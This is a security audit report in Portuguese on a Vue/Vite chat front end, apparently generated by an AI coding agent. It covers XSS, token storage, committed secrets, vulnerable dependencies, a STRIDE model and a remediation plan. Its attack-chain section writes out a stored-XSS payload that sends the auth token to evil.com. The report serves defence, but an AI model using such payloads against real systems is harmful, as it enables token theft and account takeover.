# Auditoria de Seguranca — chatfunnel-front

**Data:** 2026-05-11
**Escopo:** `chatfunnel-front/` (Vue 3 + Vite + TypeScript + PWA)
**Metodologia:** OWASP Top 10 + XSS audit + dependency scan + bug bounty + STRIDE
**Auditor:** Claude Code (6 agentes especializados em paralelo)

---

## Resumo Executivo

| Severidade | Total |
|------------|-------|
| CRITICAL   | **8**  |
| HIGH       | **25** |
| MEDIUM     | **18** |
| LOW        | **10** |
| **Total**  | **61** |

**Risco geral: CRITICO** — XSS armazenado via mensagens de contato WhatsApp/Instagram (vetor externo, zero-auth), JWT + Facebook token em localStorage sem encriptacao, sem CSP, sem X-Frame-Options, dependencias com RCE (jsonpath-plus), secrets em .env commitados no git.

---

## Top 5 Findings Mais Criticos

### 1. Stored XSS via mensagens de contato no livechat

- **Severidade:** CRITICAL
- **Arquivos:** `livechat/ContactBubble/TextBallon.vue`, `instagram/TextBallon.vue`, `StickNote.vue`, `InteractiveBallon.vue`, `Answer.vue`, `TemplateBallon.vue`
- **Vetor:** Contato envia payload HTML/JS via WhatsApp/Instagram — executa no browser de TODOS os operadores
- **DOMPurify instalado mas nao usado** — apenas `IntelligenceChatBubble.vue` aplica sanitizacao

### 2. JWT + Facebook token persistidos em localStorage sem encriptacao

- **Severidade:** CRITICAL
- **Arquivo:** `src/stores/auth.js:313` — `persist: true`
- **Dados expostos:** `token` (JWT 30d), `userData.longLivedAccessToken` (Facebook 60d), `admAccountStore` (JWT admin)

### 3. jsonpath-plus RCE (CVE-2024-21534, CVSS 9.8)

- **Severidade:** CRITICAL
- **Pacote:** `jsonpath-plus@7.2.0` — usado em 5+ arquivos de producao

### 4. Sem CSP + sem X-Frame-Options + scripts externos sem SRI

- **Severidade:** HIGH
- **Arquivos:** `index.html`, `nginx.conf`

### 5. Secrets em .env commitados no git

- **Severidade:** CRITICAL
- **Arquivos:** `.env.dev`, `.env.staging`, `.env.production` (tracked)
- **`.env.local`** (nao tracked): AWS IAM credentials, senha plaintext em comentario

---

## Findings — XSS e DOM Injection (14)

| ID | Sev | Arquivo | Vetor |
|----|-----|---------|-------|
| XSS-01 | CRITICAL | livechat/ContactBubble/TextBallon, Instagram balloons, StickNote | Mensagens de contato `v-html` sem DOMPurify |
| XSS-02 | CRITICAL | payment/*, OrganizationCard, useOrganizations | `window.location.href = api_response` — javascript: protocol |
| XSS-03 | HIGH | systemNotifications/NotificationCard | Quill HTML `v-html` sem sanitizacao |
| XSS-04 | HIGH | crm/CardModal:285 | `comment.message` `v-html` sem sanitizacao |
| XSS-05 | HIGH | intelligenceV2/AgentResult | markdown-it output sem DOMPurify |
| XSS-06 | HIGH | onboarding-v2/ChatMessage | Regex naive bold → strong sem escape |
| XSS-07 | HIGH | assistants/HistoryModal | `<img src="$1">` de regex em instruction data |
| XSS-08 | HIGH | Answer.vue, TemplateBallon.vue, LastMessage | `container.innerHTML = text` em mensagens |
| XSS-09 | MEDIUM | configuration/WhatsappChannelCard | `.includes("facebook")` — origin check fraco |
| XSS-10 | MEDIUM | form/YayForm (3 copias) | postMessage sem validacao de origin |
| XSS-11 | MEDIUM | components/misc/Tooltip | `v-html="text"` em prop nao restrito |
| XSS-12 | MEDIUM | 5+ files com jsonpath-plus@7.2.0 | ReDoS + versao desatualizada |
| XSS-13 | LOW | InputTextTag, useEditableCursor | innerHTML de variable chips (admin-controlled) |
| XSS-14 | LOW | xml2js no package.json | Nao usado em src/ — dead dep |

---

## Findings — Auth e Token (17)

| ID | Sev | Arquivo | Finding |
|----|-----|---------|---------|
| AUTH-01 | CRITICAL | stores/auth.js:313 | JWT + tokens em localStorage (persist: true) |
| AUTH-02 | CRITICAL | stores/auth.js:22 | Admin JWT em admAccountStore persistido |
| AUTH-03 | HIGH | common/utils/socket.js | Socket.IO sem token na conexao |
| AUTH-04 | HIGH | stores/auth.js:30 | isAuthenticated checa presenca, nao validade |
| AUTH-05 | HIGH | router/index.js:885 | Route guard every() fragil |
| AUTH-06 | HIGH | router/index.js:895 | Admin impersonation bypassa TODAS as permissoes |
| AUTH-07 | HIGH | main.js:79 | Sentry sendDefaultPii: true + email/name |
| AUTH-08 | HIGH | auth/LoginPage.vue:160 | Open redirect via ?redirect= sem validacao |
| AUTH-09 | MEDIUM | stores/auth.js:192 | Facebook longLivedAccessToken em Pinia state |
| AUTH-10 | MEDIUM | stores/auth.js:151 | clearToken() nao limpa userData/userAccounts |
| AUTH-11 | MEDIUM | stores/auth.js:231 | Email enviado como ID para Clarity |
| AUTH-12 | MEDIUM | common/api/index.js:34 | User-Id header setado pelo client |
| AUTH-13 | MEDIUM | common/api/index.js:50 | error.response.status sem null check |
| AUTH-14 | LOW | services/AuthService.js:23 | Email verify token como query param |
| AUTH-15 | LOW | router/index.js:10-55 | Tokens em URL path params (logados por analytics) |
| AUTH-16 | LOW | payment/StripeModal.vue:60 | Stripe token ID logado em console |
| AUTH-17 | LOW | auth/chatfunnel-signup-flow.html | HTML legacy armazena dados em localStorage |

---

## Findings — Secrets e Config (17)

| ID | Sev | Arquivo | Finding |
|----|-----|---------|---------|
| CFG-01 | CRITICAL | .env.local:50-53 | AWS IAM credentials em arquivo local |
| CFG-02 | CRITICAL | .env.local:55 | Senha plaintext em comentario |
| CFG-03 | CRITICAL | main.js:79 + auth.js:210-236 | PII enviada a Sentry/Clarity/Amplitude |
| CFG-04 | CRITICAL | 8+ componentes | v-html sem DOMPurify (consolidado) |
| CFG-05 | HIGH | .env.local:36 | VITE_FRILL_API_TOKEN (server-side) em env VITE |
| CFG-06 | HIGH | index.html, gleap, frill | Scripts externos sem SRI |
| CFG-07 | HIGH | stores/auth.js:313 | JWT em localStorage (consolidado) |
| CFG-08 | HIGH | index.html + nginx.conf | Sem Content-Security-Policy |
| CFG-09 | HIGH | vite.config.mjs:127 | Source map disable comentado |
| CFG-10 | HIGH | main.js:19-22 | Amplitude session replay 100% |
| CFG-11 | MEDIUM | .env.dev, .env.staging | pk_live Stripe em dev/staging |
| CFG-12 | MEDIUM | App.vue:180, livechat | Chat messages em IndexedDB sem encriptacao |
| CFG-13 | MEDIUM | index.html:21 | GTM container ID hardcoded |
| CFG-14 | MEDIUM | crm/CardModal:285 | Stored XSS em CRM comments (consolidado) |
| CFG-15 | LOW | vite.config.mjs:72-79 | PWA cache pode servir bundles stale |
| CFG-16 | LOW | frill/index.vue:40 | Frill CDN sem version pinning |
| CFG-17 | LOW | .env.local:48 | REDIS_URL em env de frontend |

---

## Findings — Bug Bounty Exploits (12)

| ID | Sev | Vetor | Impacto |
|----|-----|-------|---------|
| BH-01 | CRITICAL | Livechat message v-html (Instagram/Notes) | Stored XSS → token theft |
| BH-02 | CRITICAL | Reply preview formatText() + v-html | Stored XSS via template vars |
| BH-03 | HIGH | Automation node v-html | Stored XSS via flow editor |
| BH-04 | HIGH | System notification v-html | Admin XSS → all users |
| BH-05 | HIGH | CRM history HTML string injection | Stored XSS via nameUser/tag.name |
| BH-06 | HIGH | Assistant history v-html | Stored XSS via AI instructions |
| BH-07 | HIGH | Open redirect on login | Phishing chain |
| BH-08 | HIGH | Clickjacking (no X-Frame-Options) | UI redress attacks |
| BH-09 | MEDIUM | localStorage auth poisoning via XSS | Session hijack amplifier |
| BH-10 | MEDIUM | File upload sem MIME magic-byte check | Malicious file upload |
| BH-11 | LOW | PWA clientsClaim amplifica XSS | SW takeover |
| BH-12 | LOW | Socket.IO CSRF (JWT-mitigated) | Requires XSS first |

---

## Findings — STRIDE Threat Model (15)

| ID | Categoria | Sev | Finding |
|----|----------|-----|---------|
| TM-01 | Spoofing | HIGH | Socket.IO sem auth token |
| TM-02 | Info Disclosure | HIGH | JWT + FB token em localStorage |
| TM-03 | XSS | HIGH | v-html sem DOMPurify (8+ componentes) |
| TM-04 | Info Disclosure | HIGH | Secrets em .env commitados |
| TM-05 | XSS/Tampering | HIGH | Sem CSP, sem security headers |
| TM-06 | Spoofing | MEDIUM | FB App ID hardcoded, type bug |
| TM-07 | EoP | MEDIUM | Plan limits client-side only |
| TM-08 | EoP | MEDIUM | Admin impersonation em localStorage |
| TM-09 | XSS | HIGH | convertTextWithVariables HTML injection |
| TM-10 | XSS | HIGH | StickNote/InteractiveBallon raw message |
| TM-11 | Info Disclosure | MEDIUM | Sentry PII + 100% trace rate |
| TM-12 | Info Disclosure | MEDIUM | Clarity recebe email como ID |
| TM-13 | Spoofing | MEDIUM | Socket room = accountId |
| TM-14 | Tampering | MEDIUM | PWA caches sem SRI |
| TM-15 | Tampering | LOW | UTM de localStorage sem validacao |

---

## Dependencias Vulneraveis

| Pacote | Versao | Sev | CVE/Issue | Fix |
|--------|--------|-----|-----------|-----|
| jsonpath-plus | 7.2.0 | CRITICAL | CVE-2024-21534 (RCE) | >=10.1.0 |
| xlsx | 0.18.5 | HIGH | Prototype pollution, ReDoS, abandonado | Migrar para exceljs |
| multer (transitive) | <2.1.1 | HIGH | DoS x3 | npm audit fix |
| package-lock.json | — | HIGH | Corrupto/truncado | Regenerar |

---

## Attack Chain Principal

```
Passo 1: Contato WhatsApp/Instagram envia mensagem com payload XSS
         <img src=x onerror=fetch('https://evil.com?t='+localStorage.getItem('auth'))>

Passo 2: Operador abre conversa no livechat
         → XSS executa → exfiltra JWT (30d) + Facebook token (60d)

Passo 3: Atacante usa JWT para IDOR via Account-Selected (backend)
         → Exfiltra dados de qualquer conta

Passo 4: Atacante usa Facebook token para controlar WhatsApp Business
         → Enviar mensagens, ler conversas
```

**Zero-auth: atacante so precisa ser um contato.**

---

## Plano de Remediacao Priorizado

### P0 — HOJE

1. DOMPurify em TODOS os v-html de mensagens (livechat TextBallon, StickNote, InteractiveBallon, Answer, TemplateBallon)
2. Remover .env.dev/.staging/.production do git
3. Rotacionar AWS key do .env.local
4. Sentry: sendDefaultPii: false
5. Regenerar package-lock.json
6. Upgrade jsonpath-plus >=10.1.0

### P1 — Esta semana

7. DOMPurify em demais v-html (notifications, CRM, AgentResult, automations)
8. Socket.IO auth: token no handshake
9. CSP no nginx + X-Frame-Options: DENY
10. Validar redirect: so paths relativos
11. Pinia persist: excluir token, admAccountStore, longLivedAccessToken
12. Origin validation: corrigir postMessage handlers

### P2 — Proximo sprint

13. Migrar JWT para HttpOnly cookie
14. Substituir xlsx por exceljs
15. Amplitude session replay: sampleRate 0.1
16. Clarity: userId opaco
17. File upload: magic-byte validation
18. SRI em scripts externos

### P3 — Backlog

19. Encriptar IndexedDB
20. Mover FB App ID para env var
21. clearToken() resetar state completo
22. Remover HTML legacy signup-flow
23. Remover jsdom e dotenv de dependencies

---

## Metricas

- **Instancias de v-html:** 46 (8 criticas sem sanitizacao)
- **DOMPurify usado:** 1 de 46 componentes
- **Dependencias vulneraveis:** 4 (1 critical RCE)
- **Secrets em git:** 6+ keys
- **package-lock.json:** CORRUPTO
- **Total findings:** 61

---

*Relatorio gerado em 2026-05-11 por Claude Code Security Audit.*
*6 agentes: XSS/DOM, auth/token, secrets/config, deps, bug bounty, STRIDE.*
